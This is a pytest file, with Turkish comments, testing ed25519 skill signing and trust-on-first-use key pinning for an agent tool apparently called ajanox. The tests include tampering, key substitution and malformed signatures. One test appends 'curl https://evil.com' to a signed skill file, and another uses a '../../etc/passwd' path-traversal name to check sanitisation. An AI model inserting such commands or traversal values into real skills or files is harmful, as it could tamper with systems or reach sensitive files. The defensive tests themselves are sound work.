"""Skill imzalama (ed25519 + TOFU) testleri.

cryptography kurulu olmalı (ajanox[signing]). Kurulu değilse tüm modül skip.
"""

from __future__ import annotations


import pytest

from ajanox.core import signing


# cryptography yoksa tüm dosyayı atla
pytest.importorskip("cryptography")


@pytest.fixture
def trust_dir(tmp_path, monkeypatch):
    """TOFU deposunu izole tmp_path'e yönlendir."""
    td = tmp_path / "trust"
    monkeypatch.setattr(signing, "TRUST_DIR", td)
    return td


@pytest.fixture
def skill_md(tmp_path):
    d = tmp_path / "myskill"
    d.mkdir()
    md = d / "SKILL.md"
    md.write_text(
        "---\nname: myskill\nversion: 0.1.0\ndescription: test\n"
        "permissions: [shell_safe]\n---\n# Body\necho hi\n",
        encoding="utf-8",
    )
    return md


# --- keygen ---

def test_generate_keypair_lengths():
    priv, pub = signing.generate_keypair()
    assert len(bytes.fromhex(priv)) == 32
    assert len(bytes.fromhex(pub)) == 32


def test_public_from_private_deterministic():
    priv, pub = signing.generate_keypair()
    assert signing.public_from_private(priv) == pub


def test_keypairs_are_unique():
    p1, _ = signing.generate_keypair()
    p2, _ = signing.generate_keypair()
    assert p1 != p2


# --- sign + verify happy path ---

def test_sign_creates_sig_file(skill_md):
    priv, pub = signing.generate_keypair()
    sig_path = signing.sign_file(skill_md, priv)
    assert sig_path.exists()
    content = sig_path.read_text()
    assert pub in content
    assert "signature:" in content


def test_verify_valid_signature_new_trust(skill_md, trust_dir):
    priv, pub = signing.generate_keypair()
    signing.sign_file(skill_md, priv)
    result = signing.verify_file(skill_md, "myskill")
    assert result.valid is True
    assert result.trust == "new"
    assert result.pubkey == pub


def test_verify_second_time_is_match(skill_md, trust_dir):
    priv, _ = signing.generate_keypair()
    signing.sign_file(skill_md, priv)
    signing.verify_file(skill_md, "myskill")  # ilk → kaydet
    result = signing.verify_file(skill_md, "myskill")
    assert result.trust == "match"


# --- attack: tamper ---

def test_verify_tampered_content_fails(skill_md, trust_dir):
    priv, _ = signing.generate_keypair()
    signing.sign_file(skill_md, priv)
    # İçeriği imzadan sonra değiştir
    skill_md.write_text(skill_md.read_text() + "\ncurl https://evil.com\n", encoding="utf-8")
    result = signing.verify_file(skill_md, "myskill")
    assert result.valid is False
    assert "geçersiz" in (result.error or "").lower()


# --- attack: key change (TOFU) ---

def test_verify_key_change_detected(skill_md, trust_dir):
    # İlk yazar imzalar + güven kaydı oluşur
    priv1, pub1 = signing.generate_keypair()
    signing.sign_file(skill_md, priv1)
    signing.verify_file(skill_md, "myskill")

    # Saldırgan kendi anahtarıyla yeniden imzalar
    priv2, pub2 = signing.generate_keypair()
    signing.sign_file(skill_md, priv2)
    result = signing.verify_file(skill_md, "myskill", record_on_new=False)

    assert result.valid is True          # kripto olarak self-valid
    assert result.trust == "changed"     # ama TOFU yakalar
    assert result.previous_pubkey == pub1
    assert result.pubkey == pub2


# --- missing / malformed sig ---

def test_verify_missing_sig(skill_md, trust_dir):
    result = signing.verify_file(skill_md, "myskill")
    assert result.valid is False
    assert "imza dosyası yok" in (result.error or "")


def test_verify_malformed_sig(skill_md, trust_dir):
    sig = skill_md.with_name("SKILL.md.sig")
    sig.write_text("garbage without fields\n", encoding="utf-8")
    result = signing.verify_file(skill_md, "myskill")
    assert result.valid is False


# --- trust store ops ---

def test_trust_state_transitions(trust_dir):
    state, prev = signing.trust_state("foo", "aa" * 32)
    assert state == "new" and prev is None

    signing.record_trust("foo", "aa" * 32)
    state, prev = signing.trust_state("foo", "aa" * 32)
    assert state == "match"

    state, prev = signing.trust_state("foo", "bb" * 32)
    assert state == "changed"
    assert prev == "aa" * 32


def test_trust_file_sanitizes_name(trust_dir):
    # Path traversal denemesi dosya adında nötralize edilmeli
    signing.record_trust("../../etc/passwd", "cc" * 32)
    files = list(trust_dir.iterdir())
    assert len(files) == 1
    assert "/" not in files[0].name
